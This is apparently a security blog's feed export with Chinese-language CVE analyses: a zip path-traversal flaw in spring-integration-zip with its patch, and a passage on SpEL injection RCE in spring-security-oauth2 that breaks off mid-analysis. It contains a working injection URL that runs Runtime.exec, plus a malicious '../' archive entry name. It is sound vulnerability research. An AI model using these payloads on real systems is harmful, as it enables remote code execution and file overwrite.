<li><a href="https://atorralba.github.io/CVE-2018-11235/" target="_blank" rel="external">atorralba：CVE-2018-11235 - Quick &amp; Dirty PoC</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/2371&quot;&gt;RCE with Git submodule 分析-【CVE-2018-11235】&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Bin Security" scheme="http://chybeta.github.io/categories/Bin-Security/"/>
    
    
      <category term="命令执行" scheme="http://chybeta.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
      <category term="git" scheme="http://chybeta.github.io/tags/git/"/>
    
      <category term="submodule" scheme="http://chybeta.github.io/tags/submodule/"/>
    
  </entry>
  
  <entry>
    <title>Unsafe Unzip with spring-integration-zip 分析-【CVE-2018-1261 与 CVE-2018-1263】</title>
    <link href="http://chybeta.github.io/2018/05/14/Unsafe-Unzip-with-spring-integration-zip-%E5%88%86%E6%9E%90-%E3%80%90CVE-2018-1261-%E4%B8%8E-CVE-2018-1263%E3%80%91/"/>
    <id>http://chybeta.github.io/2018/05/14/Unsafe-Unzip-with-spring-integration-zip-分析-【CVE-2018-1261-与-CVE-2018-1263】/</id>
    <published>2018-05-13T23:37:38.000Z</published>
    <updated>2018-07-05T00:33:37.033Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://xz.aliyun.com/t/2334" target="_blank" rel="external">Unsafe Unzip with spring-integration-zip 分析-【CVE-2018-1261 与 CVE-2018-1263】</a><br><a id="more"></a></p>
<h1 id="漏洞公告"><a href="#漏洞公告" class="headerlink" title="漏洞公告"></a>漏洞公告</h1><p><a href="https://pivotal.io/security/cve-2018-1261" target="_blank" rel="external">https://pivotal.io/security/cve-2018-1261</a></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180512/1.png?raw=true" alt=""></p>
<p>关于 CVE-2018-1263 ，见<a href="https://xz.aliyun.com/t/2334#toc-2" target="_blank" rel="external">补丁浅析</a>部分。</p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180512/2.gif?raw=true" alt=""></p>
<p>从简单的测试代码开始：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</div><div class="line"></div><div class="line">	<span class="keyword">private</span> <span class="keyword">static</span> ResourceLoader resourceLoader = <span class="keyword">new</span> DefaultResourceLoader();</div><div class="line">	<span class="keyword">private</span> <span class="keyword">static</span> File path =  <span class="keyword">new</span> File(<span class="string">"./here/"</span>);</div><div class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String... args)</span> </span>&#123;</div><div class="line">		<span class="keyword">final</span> Resource evilResource = resourceLoader.getResource(<span class="string">"classpath:zip-malicious-traversal.zip"</span>);</div><div class="line">		<span class="keyword">try</span>&#123;</div><div class="line">			InputStream evilIS = evilResource.getInputStream();</div><div class="line">			Message&lt;InputStream&gt; evilMessage = MessageBuilder.withPayload(evilIS).build();</div><div class="line">			UnZipTransformer unZipTransformer = <span class="keyword">new</span> UnZipTransformer();</div><div class="line">			unZipTransformer.setWorkDirectory(path);</div><div class="line">			unZipTransformer.afterPropertiesSet();</div><div class="line">			unZipTransformer.transform(evilMessage);</div><div class="line">		&#125;<span class="keyword">catch</span> (Exception e)&#123;</div><div class="line">			System.out.println(e);</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>其中<code>zip-malicious-traversal.zip</code>即恶意的压缩包，结构如下：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180512/2.png?raw=true" alt=""></p>
<p><code>unZipTransformer.setWorkDirectory(path);</code>设置了正常情况下解压目录为当前目录下的here文件夹，如上gif所示，在here文件夹中生成了good.txt。而evil.txt却逃逸出了这个限制，在G://tmp下生成了。</p>
<p>环境相关源码见附件。为了复现漏洞，需要在硬盘根目录下先创建一个tmp目录，<code>zip-malicious-traversal.zip</code>在CVE-2018-1261\src\main\resources中。</p>
<p>跟踪代码，在<code>unZipTransformer.transform(evilMessage);</code>处打上断点跟入。当控制流到达 org/springframework/integration/zip/transformer/UnZipTransformer.java:112<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ZipUtil.iterate(inputStream, <span class="keyword">new</span> ZipEntryCallback() &#123; ... &#125;);</div></pre></td></tr></table></figure></p>
<p>这里会将inputStream输入，<code>ZipEntryCallback</code>作为回调函数。跟入<code>iterate</code> 至org/zeroturnaround/zip/ZipUtil.java。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">iterate</span><span class="params">(InputStream is, ZipEntryCallback action, Charset charset)</span> </span>&#123;</div><div class="line">  <span class="keyword">try</span> &#123;</div><div class="line">    ZipInputStream in = <span class="keyword">null</span>;</div><div class="line">    <span class="keyword">if</span> (charset == <span class="keyword">null</span>) &#123;</div><div class="line">        in = <span class="keyword">new</span> ZipInputStream(<span class="keyword">new</span> BufferedInputStream(is));</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span> &#123; ... &#125;</div><div class="line">    ZipEntry entry;</div><div class="line">    <span class="keyword">while</span> ((entry = in.getNextEntry()) != <span class="keyword">null</span>) &#123;</div><div class="line">      <span class="keyword">try</span> &#123;</div><div class="line">        action.process(in, entry);</div><div class="line">      &#125;</div><div class="line">      ...</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  ...</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>在iterate中，通过<code>in = new ZipInputStream(new BufferedInputStream(is));</code>生成了ZipInputStream对象<code>in</code>，此后通过<code>in.getNextEntry()</code>来获取对象in中的一个个条目。对于<code>getNextEntry()</code>而已，它会直接把目录给打印出来，具体可以参见<a href="https://stackoverflow.com/questions/11784102/how-does-zipinputstream-getnextentry-work" target="_blank" rel="external">stackoverflow: How does ZipInputStream.getNextEntry() work?</a>。所以对于<code>zip-malicious-traversal.zip</code>而言</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180512/4.png?raw=true" alt=""></p>
<p>回到UnZipTransformer.java：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180512/3.png?raw=true" alt=""></p>
<p>可以看到<code>entry</code>的值即为<code>../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../tmp/evil.txt</code>。</p>
<p>此后调用回调函数process:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">process</span><span class="params">(InputStream zipEntryInputStream, ZipEntry zipEntry)</span> <span class="keyword">throws</span> IOException </span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">final</span> String zipEntryName = zipEntry.getName();</div><div class="line">    ...</div><div class="line">    <span class="keyword">if</span> (ZipResultType.FILE.equals(zipResultType)) &#123;</div><div class="line">        <span class="keyword">final</span> File tempDir = <span class="keyword">new</span> File(workDirectory, message.getHeaders().getId().toString());</div><div class="line">        tempDir.mkdirs(); <span class="comment">//NOSONAR false positive</span></div><div class="line">        <span class="keyword">final</span> File destinationFile = <span class="keyword">new</span> File(tempDir, zipEntryName);</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (zipEntry.isDirectory()) &#123; ...   &#125;</div><div class="line">        <span class="keyword">else</span> &#123;</div><div class="line">            SpringZipUtils.copy(zipEntryInputStream, destinationFile);</div><div class="line">            uncompressedData.put(zipEntryName, destinationFile);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    ...</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><code>tempDir</code>是临时生成的文件夹，而<code>zipEntryName</code>通过<code>zipEntry.getName()</code>得到，即为<code>../../../</code>那一串。接着通过<code>final File destinationFile = new File(tempDir, zipEntryName);</code>确定解压目录，也正是这里造成了跨越目录漏洞。接着就是调用<code>copy</code>把数据写到destinationFile处。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180512/5.png?raw=true" alt=""></p>
<p>究其原因，对于getNextEntry而言,<code>../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../tmp</code>仅仅是目录名字，而对于copy操作而言，<code>../../../</code>等将被解释为目录穿越操作从而造成了任意解压。</p>
<h1 id="补丁浅析"><a href="#补丁浅析" class="headerlink" title="补丁浅析"></a>补丁浅析</h1><p>1.0.1.RELEASE中的补丁 <a href="https://github.com/spring-projects/spring-integration-extensions/commit/a5573eb232ff85199ff9bb28993df715d9a19a25" target="_blank" rel="external">Disallow traversal entity in zip</a>，主要是在进行copy操作前，对zipEntryName进行了检查<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">    <span class="keyword">if</span> (zipEntryName.contains(<span class="string">".."</span>) &amp;&amp; !destinationFile.getCanonicalPath().startsWith(workDirectory.getCanonicalPath())) &#123;</div><div class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> ZipException(<span class="string">"The file "</span> + zipEntryName + <span class="string">" is trying to leave the target output directory of "</span> + workDirectory);</div><div class="line">    &#125;</div><div class="line">```           </div><div class="line"></div><div class="line">对于恶意的压缩包，假设`destinationFile`值为`.\here\e401f4b8-<span class="number">0</span>ecb-<span class="number">3f</span>3a-<span class="number">76</span>ce-<span class="number">5318</span>b14d6000\..\..\tmp\evil.txt`时，通过调用`destinationFile.getCanonicalPath()`把``.`和`..`解析成对应的正确的路径，获得它规范化的绝对路径。之后再与工作目录`workDirectory.getCanonicalPath()`比较来确定是否存在目录穿越。</div><div class="line"></div><div class="line">对于恶意的压缩包，在生成了`destinationFile`后，假设值为`.\here\e401f4b8-<span class="number">0</span>ecb-<span class="number">3f</span>3a-<span class="number">76</span>ce-<span class="number">5318</span>b14d6000\..\..\tmp\evil.txt`时，通过调用`destinationFile.getCanonicalPath()`把``.`和`..`解析成对应的正确的路径，获得它规范化的绝对路径。之后再与工作目录`workDirectory.getCanonicalPath()`比较来确定是否存在目录穿越。</div><div class="line"></div><div class="line">之后，<span class="number">2018</span>年<span class="number">5</span>月<span class="number">11</span>日pivotal又再次放出公告：</div><div class="line">![<span class="number">11</span>.png](https:<span class="comment">//github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180512/11.png?raw=true)</span></div><div class="line"></div><div class="line">原因在于：</div></pre></td></tr></table></figure></p>
<p>While the framework itself now does not write such files, it does present the errant path to the user application, which could inadvertently write the file using that path.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">也就是说，生成的`destinationFile`其实是错误的，尽管框架本身不会有问题不会出现目录遍历漏洞，但是对于应用而言，可能之后直接使用了`destinationFile`这个路径来进行操作从而导致错误。因此在1.0.2.RELEASE版本中的补丁中[[Dissallow traversal entry even for byte[]](https://github.com/spring-projects/spring-integration-extensions/commit/d10f537283d90eabd28af57ac97f860a3913bf9b)，直接在生成`destinationFile`时做了检查：</div><div class="line"></div><div class="line">```java </div><div class="line">final File destinationFile = checkPath(message, zipEntryName);</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180512/7.png?raw=true" alt="7.png"></p>
<p>除此之外，在 <a href="https://github.com/spring-projects/spring-integration-extensions/commit/8d1752cb98f40abe521cc35884efe68c577b64eb" target="_blank" rel="external">Remove unnecessary check for the <code>..</code></a>中还将<code>zipEntryName.contains(&quot;..&quot;)</code>的判断删除，因为认为是不必要的。</p>
<h1 id="漏洞考古"><a href="#漏洞考古" class="headerlink" title="漏洞考古"></a>漏洞考古</h1><p>类似的压缩文件目录遍历漏洞以前也出现不少，列举几个。</p>
<ul>
<li><a href="https://www.nowsecure.com/blog/2015/06/16/remote-code-execution-as-system-user-on-samsung-phones/" target="_blank" rel="external">安卓：三星默认输入法远程代码执行</a><br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180512/8.png?raw=true" alt=""></li>
<li><a href="https://ajinabraham.com/blog/exploiting-insecure-file-extraction-in-python-for-code-execution" target="_blank" rel="external">Python：Exploiting insecure file extraction in Python for code execution</a><br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180512/9.png?raw=true" alt=""></li>
<li><a href="http://blog.knownsec.com/2016/11/gnu-tar-extract-pathname-bypass-cve-2016-6321/" target="_blank" rel="external">GNU tar 解压路径绕过漏洞</a><br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180512/10.png?raw=true" alt=""></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/2334&quot;&gt;Unsafe Unzip with spring-integration-zip 分析-【CVE-2018-1261 与 CVE-2018-1263】&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
    
    
      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="java" scheme="http://chybeta.github.io/tags/java/"/>
    
      <category term="spring" scheme="http://chybeta.github.io/tags/spring/"/>
    
      <category term="加压缩" scheme="http://chybeta.github.io/tags/%E5%8A%A0%E5%8E%8B%E7%BC%A9/"/>
    
  </entry>
  
  <entry>
    <title>RCE with spring-security-oauth2 分析-【CVE-2018-1260】</title>
    <link href="http://chybeta.github.io/2018/05/12/RCE-with-spring-security-oauth2-%E5%88%86%E6%9E%90-%E3%80%90CVE-2018-1260%E3%80%91/"/>
    <id>http://chybeta.github.io/2018/05/12/RCE-with-spring-security-oauth2-分析-【CVE-2018-1260】/</id>
    <published>2018-05-11T23:30:38.000Z</published>
    <updated>2018-07-05T00:33:25.680Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://xz.aliyun.com/t/2330" target="_blank" rel="external">RCE with spring-security-oauth2 分析-【CVE-2018-1260】</a><br><a id="more"></a></p>
<h1 id="漏洞公告"><a href="#漏洞公告" class="headerlink" title="漏洞公告"></a>漏洞公告</h1><p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180511/1.png?raw=true" alt=""></p>
<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>利用github上已有的demo：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/wanghongfei/spring-security-oauth2-example.git</div></pre></td></tr></table></figure></p>
<p>确保导入的spring-security-oauth2为受影响版本，以这里为例为2.0.10<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180511/2.png?raw=true" alt=""></p>
<p>进入spring-security-oauth2-example，修改 cn/com/sina/alan/oauth/config/OAuthSecurityConfig.java的第67行:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@Override</span></div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">configure</span><span class="params">(ClientDetailsServiceConfigurer clients)</span> <span class="keyword">throws</span> Exception </span>&#123;</div><div class="line">   clients.inMemory()</div><div class="line">            .withClient(<span class="string">"client"</span>)</div><div class="line">            .authorizedGrantTypes(<span class="string">"authorization_code"</span>)</div><div class="line">            .scopes();</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>根据<a href="https://github.com/wanghongfei/spring-security-oauth2-example.git" target="_blank" rel="external">spring-security-oauth2-example</a>创建对应的数据库等并修改AlanOAuthApplication中对应的mysql相关配置信息。</p>
<p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:8080/oauth/authorize?client_id=client&amp;response_type=code&amp;redirect_uri=http://www.github.com/chybeta&amp;scope=%24%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%22calc.exe%22%29%7D</div></pre></td></tr></table></figure></p>
<p>会重定向到login页面，随意输入username和password，点击login，触发payload。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180511/3.gif?raw=true" alt=""></p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>先简要补充一下关于OAuth2.0的相关知识。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180511/4.png?raw=true" alt=""></p>
<p>以上图为例。当用户使用客户端时，客户端要求授权，即图中的AB。接着客户端通过在B中获得的授权向认证服务器申请令牌，即access token。最后在EF阶段，客户端带着access token向资源服务器请求并获得资源。</p>
<p>在获得access token之前，客户端需要获得用户的授权。根据标准，有四种授权方式：授权码模式（authorization code）、简化模式（implicit）、密码模式（resource owner password credentials）、客户端模式（client credentials）。在这几种模式中，当客户端将用户导向认证服务器时，都可以带上一个可选的参数<code>scope</code>，这个参数用于表示客户端申请的权限的范围。</p>
<p>，根据<a href="http://projects.spring.io/spring-security-oauth/docs/oauth2.html" target="_blank" rel="external">官方文档</a>，在spring-security-oauth的默认配置中scope参数默认为空：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">scope: The scope to which the client is limited. If scope is undefined or empty (the default) the client is not limited by scope.</div></pre></td></tr></table></figure></p>
<p>为明白起见，我们在demo中将其清楚写出：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">clients.inMemory()</div><div class="line">        .withClient(<span class="string">"client"</span>)</div><div class="line">        .authorizedGrantTypes(<span class="string">"authorization_code"</span>)</div><div class="line">        .scopes();</div></pre></td></tr></table></figure></p>
<p>接着开始正式分析。当我们访问<code>http://localhost:8080/oauth/authorize</code>重定向至<code>http://localhost:8080/login</code>并完成login后程序流程到达<br>org/springframework/security/oauth2/provider/endpoint/AuthorizationEndpoint.java，这里贴上部分代码：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@RequestMapping</span>(value = <span class="string">"/oauth/authorize"</span>)</div><div class="line"><span class="function"><span class="keyword">public</span> ModelAndView <span class="title">authorize</span><span class="params">(Map&lt;String, Object&gt; model, @RequestParam Map&lt;String, String&gt; parameters,</span></span></div><div class="line">        SessionStatus sessionStatus, Principal principal) &#123;</div><div class="line"></div><div class="line">    <span class="comment">// Pull out the authorization request first, using the OAuth2RequestFactory. All further logic should</span></div><div class="line">    <span class="comment">// query off of the authorization request instead of referring back to the parameters map. The contents of the</span></div><div class="line">    <span class="comment">// parameters map will be stored without change in the AuthorizationRequest object once it is created.</span></div><div class="line">    AuthorizationRequest authorizationRequest = getOAuth2RequestFactory().createAuthorizationRequest(parameters);</div><div class="line"></div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        ...</div><div class="line">        <span class="comment">// We intentionally only validate the parameters requested by the client (ignoring any data that may have</span></div><div class="line">        <span class="comment">// been added to the request by the manager).</span></div><div class="line">        oauth2RequestValidator.validateScope(authorizationRequest, client);</div><div class="line">        ...</div><div class="line"></div><div class="line">        <span class="comment">// Place auth request into the model so that it is stored in the session</span></div><div class="line">        <span class="comment">// for approveOrDeny to use. That way we make sure that auth request comes from the session,</span></div><div class="line">        <span class="comment">// so any auth request parameters passed to approveOrDeny will be ignored and retrieved from the session.</span></div><div class="line">        model.put(<span class="string">"authorizationRequest"</span>, authorizationRequest);</div><div class="line"></div><div class="line">        <span class="keyword">return</span> getUserApprovalPageResponse(model, authorizationRequest, (Authentication) principal);</div><div class="line"></div><div class="line">    &#125;</div><div class="line">    ...</div></pre></td></tr></table></figure></p>
<p>第115行<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180511/5.png?raw=true" alt=""></p>
<p>在执行完<code>AuthorizationRequest authorizationRequest = ...</code>后，<code>authorizationRequest</code>代表了要认证的请求，其中包含了众多参数<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180511/6.png?raw=true" alt=""></p>
<p>在经过了对一些参数的处理，比如RedirectUri等，之后到达第156行：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// We intentionally only validate the parameters requested by the client (ignoring any data that may have</span></div><div class="line"><span class="comment">// been added to the request by the manager).</span></div><div class="line">oauth2RequestValidator.validateScope(authorizationRequest, client);</div></pre></td></tr></table></figure></p>
<p>在这里将对<code>scope</code>参数进行验证。跟入<code>validateScope</code>到org/springframework/security/oauth2/provider/request/DefaultOAuth2RequestValidator.java:19<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DefaultOAuth2RequestValidator</span> <span class="keyword">implements</span> <span class="title">OAuth2RequestValidator</span> </span>&#123;</div><div class="line"></div><div class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">validateScope</span><span class="params">(AuthorizationRequest authorizationRequest, ClientDetails client)</span> <span class="keyword">throws</span> InvalidScopeException </span>&#123;</div><div class="line">		validateScope(authorizationRequest.getScope(), client.getScope());</div><div class="line">	&#125;</div><div class="line">    ...</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>继续跟入<code>validateScope</code>，至 org/springframework/security/oauth2/provider/request/DefaultOAuth2RequestValidator.java:28<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">validateScope</span><span class="params">(Set&lt;String&gt; requestScopes, Set&lt;String&gt; clientScopes)</span> </span>&#123;</div><div class="line"></div><div class="line">	<span class="keyword">if</span> (clientScopes != <span class="keyword">null</span> &amp;&amp; !clientScopes.isEmpty()) &#123;</div><div class="line">		<span class="keyword">for</span> (String scope : requestScopes) &#123;</div><div class="line">			<span class="keyword">if</span> (!clientScopes.contains(scope)) &#123;</div><div class="line">				<span class="keyword">throw</span> <span class="keyword">new</span> InvalidScopeException(<span class="string">"Invalid scope: "</span> + scope, clientScopes);</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	</div><div class="line">	<span class="keyword">if</span> (requestScopes.isEmpty()) &#123;</div><div class="line">		<span class="keyword">throw</span> <span class="keyword">new</span> InvalidScopeException(<span class="string">"Empty scope (either the client or the user is not allowed the requested scopes)"</span>);</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>首先检查<code>clientScopes</code>，这个<code>clientScopes</code>即我们在前面configure中配置的<code>.scopes();</code>，倘若不为空，则进行白名单检查。举个例子，如果前面配置<code>.scopes(&quot;chybeta&quot;);</code>，则传入<code>requestScopes</code>必须为<code>chybeta</code>，否则会直接抛出异常<code>Invalid scope:xxx</code>。但由于此处查<code>clientScopes</code>为空值，则接下来仅仅做了<code>requestScopes.isEmpty()</code>的检查并且通过。</p>
<p>在完成了各项检查和配置后，在<code>authorize</code>函数的最后执行：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">return</span> getUserApprovalPageResponse(model, authorizationRequest, (Authentication) principal);</div></pre></td></tr></table></figure></p>
<p>回想一下前面OAuth2.0的流程，在客户端请求授权（A），用户登陆认证（B）后，将会进行用户授权（C），这里即开始进行正式的授权阶段。跟入<code>getUserApprovalPageResponse</code> 至org/springframework/security/oauth2/provider/endpoint/AuthorizationEndpoint.java:241：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180511/7.png?raw=true" alt=""></p>
<p>生成对应的model和view，之后将会forward到<code>/oauth/confirm_access</code>。为简单起见，我省略中间过程，直接定位到org/springframework/security/oauth2/provider/endpoint/WhitelabelApprovalEndpoint.java:20<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WhitelabelApprovalEndpoint</span> </span>&#123;</div><div class="line"></div><div class="line">	<span class="meta">@RequestMapping</span>(<span class="string">"/oauth/confirm_access"</span>)</div><div class="line">	<span class="function"><span class="keyword">public</span> ModelAndView <span class="title">getAccessConfirmation</span><span class="params">(Map&lt;String, Object&gt; model, HttpServletRequest request)</span> <span class="keyword">throws</span> Exception </span>&#123;</div><div class="line">		String template = createTemplate(model, request);</div><div class="line">		<span class="keyword">if</span> (request.getAttribute(<span class="string">"_csrf"</span>) != <span class="keyword">null</span>) &#123;</div><div class="line">			model.put(<span class="string">"_csrf"</span>, request.getAttribute(<span class="string">"_csrf"</span>));</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">return</span> <span class="keyword">new</span> ModelAndView(<span class="keyword">new</span> SpelView(template), model);</div><div class="line">	&#125;</div><div class="line">    ...</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>跟入<code>createTemplate</code>，第29行：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">protected</span> String <span class="title">createTemplate</span><span class="params">(Map&lt;String, Object&gt; model, HttpServletRequest request)</span> </span>&#123;</div><div class="line">    String template = TEMPLATE;</div><div class="line">    <span class="keyword">if</span> (model.containsKey(<span class="string">"scopes"</span>) || request.getAttribute(<span class="string">"scopes"</span>) != <span class="keyword">null</span>) &#123;</div><div class="line">        template = template.replace(<span class="string">"%scopes%"</span>, createScopes(model, request)).replace(<span class="string">"%denial%"</span>, <span class="string">""</span>);</div><div class="line">    &#125;</div><div class="line">    ...</div><div class="line">    <span class="keyword">return</span> template;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>跟入<code>createScopes</code>，第46行：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180511/8.png?raw=true" alt=""></p>
